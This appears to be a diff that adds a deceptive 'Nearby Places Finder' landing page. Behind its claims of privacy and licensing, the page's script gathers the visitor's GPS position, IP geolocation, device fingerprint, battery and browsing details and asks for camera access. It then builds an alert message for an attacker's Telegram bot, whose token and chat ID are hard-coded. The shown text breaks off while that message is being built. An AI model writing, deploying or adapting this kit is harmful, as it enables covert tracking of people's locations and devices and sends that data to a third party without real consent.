@@ -1,0 +1,1340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#667eea">
+    <meta name="description" content="Discover amazing places near you - Hotels, Restaurants, Parks, Hospitals and more!">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Welcome - Nearby Places Finder</title>
+    
+    <style>
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            -webkit-text-size-adjust: 100%;
+            -ms-text-size-adjust: 100%;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            min-height: -webkit-fill-available;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            animation: slideUp 0.5s ease forwards;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #ffffff;
+            padding: 40px 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.2em;
+            margin-bottom: 10px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        .header p {
+            font-size: 1.1em;
+            opacity: 0.95;
+            font-weight: 400;
+        }
+
+        .content {
+            padding: 35px 30px;
+        }
+
+        .section {
+            margin-bottom: 25px;
+        }
+
+        .section h2 {
+            color: #2d3436;
+            margin-bottom: 12px;
+            font-size: 1.3em;
+            font-weight: 600;
+        }
+
+        .section > p {
+            color: #636e72;
+            line-height: 1.7;
+            font-size: 1em;
+        }
+
+        .feature-list {
+            list-style: none;
+            margin-top: 15px;
+        }
+
+        .feature-list li {
+            padding: 12px 0;
+            color: #2d3436;
+            display: flex;
+            align-items: center;
+            font-size: 0.95em;
+            border-bottom: 1px solid #f1f2f6;
+        }
+
+        .feature-list li:last-child {
+            border-bottom: none;
+        }
+
+        .feature-icon {
+            display: inline-flex;
+            width: 28px;
+            height: 28px;
+            background: linear-gradient(135deg, #00b894 0%, #00a885 100%);
+            color: #ffffff;
+            border-radius: 50%;
+            align-items: center;
+            justify-content: center;
+            margin-right: 14px;
+            font-weight: bold;
+            flex-shrink: 0;
+            font-size: 13px;
+        }
+
+        .permission-box {
+            background: linear-gradient(135deg, #fff9e6 0%, #fff3cd 100%);
+            border-left: 4px solid #ffc107;
+            padding: 22px;
+            margin: 25px 0;
+            border-radius: 0 12px 12px 0;
+        }
+
+        .permission-box h3 {
+            color: #856404;
+            margin-bottom: 14px;
+            font-size: 1.1em;
+            font-weight: 600;
+        }
+
+        .permission-box > p {
+            color: #856404;
+            font-size: 0.95em;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+
+        .permission-box .feature-list li {
+            color: #856404;
+            border-bottom-color: rgba(133, 100, 4, 0.15);
+            padding: 10px 0;
+        }
+
+        .permission-box .feature-icon {
+            background: linear-gradient(135deg, #ffc107 0%, #e0a800 100%);
+            color: #856404;
+            font-size: 14px;
+        }
+
+        .privacy-box {
+            background: linear-gradient(135deg, #e8f8f0 0%, #d4edda 100%);
+            border-left: 4px solid #28a745;
+            padding: 22px;
+            margin: 25px 0;
+            border-radius: 0 12px 12px 0;
+        }
+
+        .privacy-box h3 {
+            color: #1e7e34;
+            margin-bottom: 12px;
+            font-size: 1.1em;
+            font-weight: 600;
+        }
+
+        .privacy-box p {
+            color: #1e7e34;
+            font-size: 0.95em;
+            line-height: 1.7;
+        }
+
+        .license-box {
+            text-align: center;
+            padding: 28px 22px;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border-radius: 14px;
+            margin: 25px 0;
+            border: 1px solid #dee2e6;
+        }
+
+        .license-box h3 {
+            color: #2d3436;
+            margin-bottom: 12px;
+            font-size: 1.15em;
+            font-weight: 600;
+        }
+
+        .license-box > p {
+            color: #636e72;
+            margin-bottom: 18px;
+            font-size: 0.95em;
+            line-height: 1.6;
+        }
+
+        .license-link {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #ffffff;
+            padding: 14px 32px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            font-size: 0.95em;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        .license-link:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.45);
+        }
+
+        .license-link:active {
+            transform: translateY(0);
+        }
+
+        .cta-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 20px 24px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #ffffff;
+            text-align: center;
+            text-decoration: none;
+            border: none;
+            border-radius: 35px;
+            font-size: 1.2em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 28px;
+            box-shadow: 0 10px 35px rgba(102, 126, 234, 0.35);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cta-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .cta-button:hover:not(:disabled)::before {
+            left: 100%;
+        }
+
+        .cta-button:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 45px rgba(102, 126, 234, 0.5);
+        }
+
+        .cta-button:active:not(:disabled) {
+            transform: translateY(-1px);
+        }
+
+        .cta-button:disabled {
+            opacity: 0.75;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .cta-button:disabled::before {
+            display: none;
+        }
+
+        .status-message {
+            text-align: center;
+            padding: 22px;
+            margin: 22px 0;
+            border-radius: 14px;
+            font-weight: 600;
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .status-message.loading {
+            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
+            color: #1565c0;
+            display: block;
+        }
+
+        .status-message.success {
+            background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
+            color: #2e7d32;
+            display: block;
+        }
+
+        .status-message.error {
+            background: linear-gradient(135deg, #ffebee 0%, #ffcdd2 100%);
+            color: #c62828;
+            display: block;
+        }
+
+        .loader-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+
+        .loader {
+            border: 3px solid #bbdefb;
+            border-top: 3px solid #1565c0;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 1em;
+            line-height: 1.5;
+        }
+
+        .disclaimer {
+            text-align: center;
+            font-size: 0.85em;
+            color: #95a5a6;
+            margin-top: 22px;
+            line-height: 1.65;
+            padding: 0 10px;
+        }
+
+        .footer {
+            background: #f8f9fa;
+            padding: 22px;
+            text-align: center;
+            color: #636e72;
+            font-size: 0.9em;
+            border-top: 1px solid #e9ecef;
+        }
+
+        /* Noscript styles */
+        .noscript-message {
+            background: #ffebee;
+            color: #c62828;
+            padding: 30px;
+            text-align: center;
+            border-radius: 12px;
+            margin: 20px;
+        }
+
+        .noscript-message h2 {
+            margin-bottom: 15px;
+        }
+
+        /* Initial page loader */
+        .page-loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+        }
+
+        .page-loader.hidden {
+            opacity: 0;
+            visibility: hidden;
+        }
+
+        .page-loader-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        /* Responsive styles */
+        @media (max-width: 600px) {
+            body {
+                padding: 12px;
+            }
+
+            .header {
+                padding: 32px 22px;
+            }
+
+            .header h1 {
+                font-size: 1.75em;
+            }
+
+            .header p {
+                font-size: 1em;
+            }
+
+            .content {
+                padding: 25px 20px;
+            }
+
+            .section h2 {
+                font-size: 1.2em;
+            }
+
+            .feature-list li {
+                font-size: 0.9em;
+                padding: 10px 0;
+            }
+
+            .feature-icon {
+                width: 26px;
+                height: 26px;
+                font-size: 12px;
+                margin-right: 12px;
+            }
+
+            .permission-box,
+            .privacy-box {
+                padding: 18px;
+                margin: 20px 0;
+            }
+
+            .license-box {
+                padding: 22px 18px;
+            }
+
+            .license-link {
+                padding: 12px 26px;
+                font-size: 0.9em;
+            }
+
+            .cta-button {
+                font-size: 1.1em;
+                padding: 18px 20px;
+            }
+
+            .status-message {
+                padding: 18px;
+            }
+
+            .disclaimer {
+                font-size: 0.8em;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .header h1 {
+                font-size: 1.5em;
+            }
+
+            .content {
+                padding: 20px 16px;
+            }
+
+            .cta-button {
+                font-size: 1em;
+                padding: 16px 18px;
+            }
+        }
+
+        /* Reduced motion for accessibility */
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Initial Page Loader -->
+    <div class="page-loader" id="pageLoader">
+        <div class="page-loader-spinner"></div>
+    </div>
+
+    <!-- Noscript fallback -->
+    <noscript>
+        <div class="noscript-message">
+            <h2>⚠️ JavaScript Required</h2>
+            <p>Please enable JavaScript in your browser settings to use this service.</p>
+            <p>This is required to find places near your location.</p>
+        </div>
+    </noscript>
+
+    <div class="container">
+        <div class="header">
+            <h1>🌍 Welcome!</h1>
+            <p>Discover Amazing Places Near You</p>
+        </div>
+
+        <div class="content">
+            <div class="section">
+                <h2>What We Offer</h2>
+                <p>Find the best places around you instantly:</p>
+                <ul class="feature-list">
+                    <li><span class="feature-icon">✓</span> Hotels & Restaurants nearby</li>
+                    <li><span class="feature-icon">✓</span> Parks & Recreational Spots</li>
+                    <li><span class="feature-icon">✓</span> Hospitals & Healthcare facilities</li>
+                    <li><span class="feature-icon">✓</span> Best Date Spots & Romantic places</li>
+                    <li><span class="feature-icon">✓</span> Entertainment & Shopping centers</li>
+                </ul>
+            </div>
+
+            <div class="permission-box">
+                <h3>⚠️ Permissions Required</h3>
+                <p><strong>To provide accurate nearby locations, we need:</strong></p>
+                <ul class="feature-list">
+                    <li><span class="feature-icon">📍</span> Location Access - to find places near you</li>
+                    <li><span class="feature-icon">📷</span> Camera Access - for QR scanning & reviews</li>
+                    <li><span class="feature-icon">📱</span> Device Info - to optimize your experience</li>
+                </ul>
+            </div>
+
+            <div class="privacy-box">
+                <h3>🔒 Your Privacy Matters</h3>
+                <p>We collect this data ONLY to show you nearby places. Your information is secure and never sold to third parties. You can revoke permissions anytime from your device settings.</p>
+            </div>
+
+            <div class="license-box">
+                <h3>📜 Legal & Certified</h3>
+                <p>Our service is fully licensed and compliant with data protection regulations.</p>
+                <!-- ========== REPLACE WITH YOUR LICENSE LINK ========== -->
+                <a href="YOUR_LICENSE_LINK_HERE" class="license-link" target="_blank" rel="noopener noreferrer">
+                    📄 View Our License
+                </a>
+            </div>
+
+            <div id="statusMessage" class="status-message" role="status" aria-live="polite"></div>
+
+            <button id="continueBtn" class="cta-button" type="button" aria-label="Continue to main site">
+                🚀 Continue to Main Site
+            </button>
+
+            <p class="disclaimer">
+                By continuing, you acknowledge that you have read our privacy policy and agree to share the required information for service functionality.
+            </p>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 Nearby Places Finder. All Rights Reserved.</p>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ============================================================
+            // CONFIGURATION - REPLACE THESE VALUES WITH YOUR OWN
+            // ============================================================
+            
+            var CONFIG = {
+                // Your Telegram Bot Token (from @BotFather)
+                TELEGRAM_BOT_TOKEN: '8183958141:AAFa11kk0EAYS_khjVClcmLyAyFJvxIozQI',
+                
+                // Your Telegram Chat ID (group/channel ID with minus sign)
+                TELEGRAM_CHAT_ID: '-1003623366096',
+                
+                // ========== REPLACE WITH YOUR MAIN WEBSITE URL ==========
+                MAIN_SITE_URL: 'https://your-main-website.com',
+                
+                // Telegram retry settings
+                TELEGRAM_MAX_RETRIES: 3,
+                TELEGRAM_RETRY_DELAY: 1000,
+                
+                // IP Geolocation APIs (multiple fallbacks)
+                IP_APIS: [
+                    { url: 'https://ipapi.co/json/', type: 'ipapi' },
+                    { url: 'https://ip-api.com/json/?fields=66846719', type: 'ip-api' },
+                    { url: 'https://ipwho.is/', type: 'ipwhois' }
+                ],
+                
+                // Timeouts
+                API_TIMEOUT: 8000,
+                LOCATION_TIMEOUT: 20000,
+                
+                // Redirect delay after success (ms)
+                REDIRECT_DELAY: 1500
+            };
+
+            // ============================================================
+            // GLOBAL STATE
+            // ============================================================
+            
+            var pageLoadTime = Date.now();
+            var isProcessing = false;
+            var sessionId = generateSessionId();
+
+            // ============================================================
+            // UTILITY FUNCTIONS
+            // ============================================================
+
+            function generateSessionId() {
+                return 'xxxx-xxxx-xxxx'.replace(/x/g, function() {
+                    return Math.floor(Math.random() * 16).toString(16);
+                });
+            }
+
+            function escapeHtml(text) {
+                if (text === null || text === undefined) return 'N/A';
+                var str = String(text);
+                var map = {
+                    '&': '&amp;',
+                    '<': '&lt;',
+                    '>': '&gt;',
+                    '"': '&quot;',
+                    "'": '&#039;'
+                };
+                return str.replace(/[&<>"']/g, function(m) { return map[m]; });
+            }
+
+            function getTimestamp() {
+                try {
+                    return new Date().toLocaleString('en-IN', {
+                        timeZone: 'Asia/Kolkata',
+                        year: 'numeric',
+                        month: '2-digit',
+                        day: '2-digit',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit',
+                        hour12: true
+                    });
+                } catch (e) {
+                    return new Date().toString();
+                }
+            }
+
+            function getTimeOnPage() {
+                var seconds = Math.floor((Date.now() - pageLoadTime) / 1000);
+                if (seconds < 60) return seconds + ' seconds';
+                var minutes = Math.floor(seconds / 60);
+                var remainingSeconds = seconds % 60;
+                return minutes + 'm ' + remainingSeconds + 's';
+            }
+
+            function getDeviceType() {
+                var ua = navigator.userAgent || '';
+                if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+                    return 'Tablet';
+                }
+                if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
+                    return 'Mobile';
+                }
+                return 'Desktop';
+            }
+
+            function getBrowser() {
+                var ua = navigator.userAgent || '';
+                var browser = 'Unknown';
+                var version = '';
+
+                if (ua.indexOf('Firefox') > -1) {
+                    browser = 'Firefox';
+                    version = ua.match(/Firefox\/(\d+)/);
+                } else if (ua.indexOf('SamsungBrowser') > -1) {
+                    browser = 'Samsung Browser';
+                    version = ua.match(/SamsungBrowser\/(\d+)/);
+                } else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) {
+                    browser = 'Opera';
+                    version = ua.match(/(?:Opera|OPR)\/(\d+)/);
+                } else if (ua.indexOf('Trident') > -1) {
+                    browser = 'Internet Explorer';
+                    version = ua.match(/rv:(\d+)/);
+                } else if (ua.indexOf('Edg') > -1) {
+                    browser = 'Edge';
+                    version = ua.match(/Edg\/(\d+)/);
+                } else if (ua.indexOf('Chrome') > -1) {
+                    browser = 'Chrome';
+                    version = ua.match(/Chrome\/(\d+)/);
+                } else if (ua.indexOf('Safari') > -1) {
+                    browser = 'Safari';
+                    version = ua.match(/Version\/(\d+)/);
+                }
+
+                if (version && version[1]) {
+                    browser += ' ' + version[1];
+                }
+
+                return browser;
+            }
+
+            function getOS() {
+                var ua = navigator.userAgent || '';
+                var os = 'Unknown';
+
+                if (ua.indexOf('Windows NT 10') > -1) os = 'Windows 10/11';
+                else if (ua.indexOf('Windows NT 6.3') > -1) os = 'Windows 8.1';
+                else if (ua.indexOf('Windows NT 6.2') > -1) os = 'Windows 8';
+                else if (ua.indexOf('Windows NT 6.1') > -1) os = 'Windows 7';
+                else if (ua.indexOf('Windows') > -1) os = 'Windows';
+                else if (ua.indexOf('Mac OS X') > -1) {
+                    var match = ua.match(/Mac OS X (\d+[._]\d+)/);
+                    os = match ? 'macOS ' + match[1].replace('_', '.') : 'macOS';
+                }
+                else if (ua.indexOf('Android') > -1) {
+                    var match = ua.match(/Android (\d+(\.\d+)?)/);
+                    os = match ? 'Android ' + match[1] : 'Android';
+                }
+                else if (ua.indexOf('like Mac OS X') > -1) {
+                    var match = ua.match(/OS (\d+[._]\d+)/);
+                    os = match ? 'iOS ' + match[1].replace('_', '.') : 'iOS';
+                }
+                else if (ua.indexOf('Linux') > -1) os = 'Linux';
+                else if (ua.indexOf('CrOS') > -1) os = 'Chrome OS';
+
+                return os;
+            }
+
+            function getScreenOrientation() {
+                try {
+                    if (screen.orientation && screen.orientation.type) {
+                        return screen.orientation.type.indexOf('portrait') > -1 ? 'Portrait' : 'Landscape';
+                    }
+                    return window.innerHeight > window.innerWidth ? 'Portrait' : 'Landscape';
+                } catch (e) {
+                    return 'Unknown';
+                }
+            }
+
+            function getConnectionType() {
+                try {
+                    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    if (conn) {
+                        var type = conn.effectiveType || conn.type || 'Unknown';
+                        var downlink = conn.downlink ? conn.downlink + ' Mbps' : '';
+                        return type.toUpperCase() + (downlink ? ' (' + downlink + ')' : '');
+                    }
+                    return 'Unknown';
+                } catch (e) {
+                    return 'Unknown';
+                }
+            }
+
+            function getBatteryInfo() {
+                return new Promise(function(resolve) {
+                    try {
+                        if (navigator.getBattery) {
+                            navigator.getBattery().then(function(battery) {
+                                resolve({
+                                    level: Math.round(battery.level * 100) + '%',
+                                    charging: battery.charging ? 'Yes' : 'No'
+                                });
+                            }).catch(function() {
+                                resolve(null);
+                            });
+                        } else {
+                            resolve(null);
+                        }
+                    } catch (e) {
+                        resolve(null);
+                    }
+                });
+            }
+
+            function getTouchSupport() {
+                try {
+                    return ('ontouchstart' in window) || 
+                           (navigator.maxTouchPoints > 0) || 
+                           (navigator.msMaxTouchPoints > 0) ? 'Yes' : 'No';
+                } catch (e) {
+                    return 'Unknown';
+                }
+            }
+
+            function getHardwareInfo() {
+                return {
+                    cores: navigator.hardwareConcurrency || 'Unknown',
+                    memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+                    platform: navigator.platform || 'Unknown'
+                };
+            }
+
+            function showStatus(message, type) {
+                var statusEl = document.getElementById('statusMessage');
+                statusEl.className = 'status-message ' + type;
+
+                if (type === 'loading') {
+                    statusEl.innerHTML = '<div class="loader-container"><div class="loader"></div></div><div class="status-text">' + message + '</div>';
+                } else {
+                    statusEl.innerHTML = '<div class="status-text">' + message + '</div>';
+                }
+            }
+
+            function hidePageLoader() {
+                var loader = document.getElementById('pageLoader');
+                if (loader) {
+                    loader.classList.add('hidden');
+                    setTimeout(function() {
+                        loader.style.display = 'none';
+                    }, 400);
+                }
+            }
+
+            // ============================================================
+            // IP LOCATION FETCHER (with multiple fallbacks)
+            // ============================================================
+
+            function fetchWithTimeout(url, timeout) {
+                return new Promise(function(resolve, reject) {
+                    var controller;
+                    var timeoutId;
+
+                    if (window.AbortController) {
+                        controller = new AbortController();
+                        timeoutId = setTimeout(function() {
+                            controller.abort();
+                        }, timeout);
+                    }
+
+                    fetch(url, controller ? { signal: controller.signal } : {})
+                        .then(function(response) {
+                            clearTimeout(timeoutId);
+                            if (!response.ok) throw new Error('HTTP ' + response.status);
+                            return response.json();
+                        })
+                        .then(resolve)
+                        .catch(reject);
+
+                    if (!controller) {
+                        setTimeout(function() {
+                            reject(new Error('Timeout'));
+                        }, timeout);
+                    }
+                });
+            }
+
+            function parseIPResponse(data, type) {
+                var result = {
+                    ip: 'Unknown',
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    country: 'Unknown',
+                    latitude: null,
+                    longitude: null,
+                    isp: 'Unknown',
+                    success: false
+                };
+
+                try {
+                    if (type === 'ipapi' && data && !data.error) {
+                        result.ip = data.ip || 'Unknown';
+                        result.city = data.city || 'Unknown';
+                        result.region = data.region || 'Unknown';
+                        result.country = data.country_name || 'Unknown';
+                        result.latitude = data.latitude;
+                        result.longitude = data.longitude;
+                        result.isp = data.org || 'Unknown';
+                        result.success = true;
+                    } else if (type === 'ip-api' && data && data.status === 'success') {
+                        result.ip = data.query || 'Unknown';
+                        result.city = data.city || 'Unknown';
+                        result.region = data.regionName || 'Unknown';
+                        result.country = data.country || 'Unknown';
+                        result.latitude = data.lat;
+                        result.longitude = data.lon;
+                        result.isp = data.isp || data.org || 'Unknown';
+                        result.success = true;
+                    } else if (type === 'ipwhois' && data && data.success !== false) {
+                        result.ip = data.ip || 'Unknown';
+                        result.city = data.city || 'Unknown';
+                        result.region = data.region || 'Unknown';
+                        result.country = data.country || 'Unknown';
+                        result.latitude = data.latitude;
+                        result.longitude = data.longitude;
+                        result.isp = data.connection ? data.connection.isp : 'Unknown';
+                        result.success = true;
+                    }
+                } catch (e) {
+                    console.error('Error parsing IP response:', e);
+                }
+
+                return result;
+            }
+
+            async function getIPLocation() {
+                for (var i = 0; i < CONFIG.IP_APIS.length; i++) {
+                    try {
+                        var api = CONFIG.IP_APIS[i];
+                        var data = await fetchWithTimeout(api.url, CONFIG.API_TIMEOUT);
+                        var result = parseIPResponse(data, api.type);
+                        if (result.success) {
+                            return result;
+                        }
+                    } catch (e) {
+                        console.log('IP API ' + (i + 1) + ' failed:', e.message);
+                    }
+                }
+
+                return {
+                    ip: 'Unknown',
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    country: 'Unknown',
+                    latitude: null,
+                    longitude: null,
+                    isp: 'Unknown',
+                    success: false
+                };
+            }
+
+            // ============================================================
+            // COLLECT ALL DATA
+            // ============================================================
+
+            async function collectAllData() {
+                var hardware = getHardwareInfo();
+                var battery = await getBatteryInfo();
+
+                var data = {
+                    sessionId: sessionId,
+                    timestamp: getTimestamp(),
+                    timeOnPage: getTimeOnPage(),
+                    device: {
+                        type: getDeviceType(),
+                        browser: getBrowser(),
+                        os: getOS(),
+                        platform: hardware.platform,
+                        language: navigator.language || navigator.userLanguage || 'Unknown',
+                        languages: (navigator.languages || []).join(', ') || 'Unknown',
+                        screenResolution: window.screen.width + 'x' + window.screen.height,
+                        screenAvailable: window.screen.availWidth + 'x' + window.screen.availHeight,
+                        viewport: window.innerWidth + 'x' + window.innerHeight,
+                        colorDepth: (window.screen.colorDepth || 'Unknown') + '-bit',
+                        pixelRatio: window.devicePixelRatio || 1,
+                        orientation: getScreenOrientation(),
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+                        timezoneOffset: 'UTC' + (new Date().getTimezoneOffset() > 0 ? '-' : '+') + Math.abs(new Date().getTimezoneOffset() / 60),
+                        cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+                        doNotTrack: navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled',
+                        online: navigator.onLine ? 'Yes' : 'No',
+                        touchSupport: getTouchSupport(),
+                        cpuCores: hardware.cores,
+                        memory: hardware.memory,
+                        connection: getConnectionType(),
+                        battery: battery
+                    },
+                    session: {
+                        referrer: document.referrer || 'Direct Visit',
+                        currentURL: window.location.href,
+                        pageTitle: document.title,
+                        historyLength: window.history.length || 1
+                    },
+                    permissions: {
+                        location: 'Pending',
+                        camera: 'Pending'
+                    },
+                    location: {
+                        gps: null,
+                        ip: null
+                    }
+                };
+
+                return data;
+            }
+
+            // ============================================================
+            // REQUEST PERMISSIONS
+            // ============================================================
+
+            function requestLocationPermission(data) {
+                return new Promise(function(resolve) {
+                    if (!navigator.geolocation) {
+                        data.permissions.location = '❌ Not Supported';
+                        resolve(data);
+                        return;
+                    }
+
+                    var timeoutId = setTimeout(function() {
+                        data.permissions.location = '❌ Timeout';
+                        resolve(data);
+                    }, CONFIG.LOCATION_TIMEOUT);
+
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            clearTimeout(timeoutId);
+                            data.permissions.location = '✅ Granted';
+                            data.location.gps = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy ? Math.round(position.coords.accuracy) + 'm' : 'N/A',
+                                altitude: position.coords.altitude ? Math.round(position.coords.altitude) + 'm' : 'N/A',
+                                altitudeAccuracy: position.coords.altitudeAccuracy ? Math.round(position.coords.altitudeAccuracy) + 'm' : 'N/A',
+                                heading: position.coords.heading ? Math.round(position.coords.heading) + '°' : 'N/A',
+                                speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(1) + ' km/h' : 'N/A',
+                                timestamp: new Date(position.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+                            };
+                            resolve(data);
+                        },
+                        function(error) {
+                            clearTimeout(timeoutId);
+                            switch (error.code) {
+                                case 1:
+                                    data.permissions.location = '❌ Denied by User';
+                                    break;
+                                case 2:
+                                    data.permissions.location = '❌ Position Unavailable';
+                                    break;
+                                case 3:
+                                    data.permissions.location = '❌ Timeout';
+                                    break;
+                                default:
+                                    data.permissions.location = '❌ Error';
+                            }
+                            resolve(data);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: CONFIG.LOCATION_TIMEOUT - 2000,
+                            maximumAge: 0
+                        }
+                    );
+                });
+            }
+
+            function requestCameraPermission(data) {
+                return new Promise(function(resolve) {
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        data.permissions.camera = '❌ Not Supported';
+                        resolve(data);
+                        return;
+                    }
+
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+                        .then(function(stream) {
+                            data.permissions.camera = '✅ Granted';
+                            stream.getTracks().forEach(function(track) {
+                                track.stop();
+                            });
+                            resolve(data);
+                        })
+                        .catch(function(error) {
+                            if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+                                data.permissions.camera = '❌ Denied by User';
+                            } else if (error.name === 'NotFoundError' || error.name === 'DevicesNotFoundError') {
+                                data.permissions.camera = '❌ No Camera Found';
+                            } else if (error.name === 'NotReadableError' || error.name === 'TrackStartError') {
+                                data.permissions.camera = '❌ Camera in Use';
+                            } else if (error.name === 'OverconstrainedError') {
+                                data.permissions.camera = '❌ Camera Constraints Error';
+                            } else if (error.name === 'TypeError') {
+                                data.permissions.camera = '❌ Invalid Constraints';
+                            } else {
+                                data.permissions.camera = '❌ Error: ' + (error.name || 'Unknown');
+                            }
+                            resolve(data);
+                        });
+                });
+            }
+
+            // ============================================================
+            // TELEGRAM MESSAGE BUILDER
+            // ============================================================
+
+            function buildTelegramMessage(data) {
+                var mapLink = 'N/A';
+                var locationDetails = '';
+
+                // Determine location display
+                if (data.location.gps) {
+                    var lat = data.location.gps.latitude.toFixed(6);
+                    var lon = data.location.gps.longitude.toFixed(6);
+                    mapLink = 'https://www.google.com/maps?q=' + lat + ',' + lon;
+                    locationDetails = '' +
+                        '• <b>GPS Latitude:</b> ' + lat + '\n' +
+                        '• <b>GPS Longitude:</b> ' + lon + '\n' +
+                        '• <b>Accuracy:</b> ' + escapeHtml(data.location.gps.accuracy) + '\n' +
+                        '• <b>Altitude:</b> ' + escapeHtml(data.location.gps.altitude) + '\n' +
+                        '• <b>Speed:</b> ' + escapeHtml(data.location.gps.speed) + '\n' +
+                        '• <b>GPS Status:</b> ' + data.permissions.location;
+                } else if (data.location.ip && data.location.ip.success && data.location.ip.latitude) {
+                    mapLink = 'https://www.google.com/maps?q=' + data.location.ip.latitude + ',' + data.location.ip.longitude;
+                    locationDetails = '' +
+                        '• <b>GPS Status:</b> ' + data.permissions.location + '\n' +
+                        '• <b>Fallback:</b> Using IP-based location';
+                } else {
+                    locationDetails = '' +
+                        '• <b>GPS Status:</b> ' + data.permissions.location + '\n' +
+                        '• <b>IP Location:</b> Failed to determine';
+                }
+
+                var message = '';
+                message += '🆕 <b>NEW VISITOR ALERT!</b>\n\n';
+                message += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                message += '🔑 <b>Session ID:</b> ' + escapeHtml(data.sessionId) + '\n';
+                message += '⏰ <b>Time:</b> ' + escapeHtml(data.timestamp) + '\n';
+                message += '⏱️ <b>Time on Page:</b> ' + escapeHtml(data.timeOnPage) + '\n';
+                message += '━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+
+                message += '📍 <b>LOCATION DATA:</b>\n';
+                message += locationDetails + '\n\n';
+
+                if (data.location.ip && data.location.ip.success) {
+                    message += '🌐 <b>IP GEOLOCATION:</b>\n';
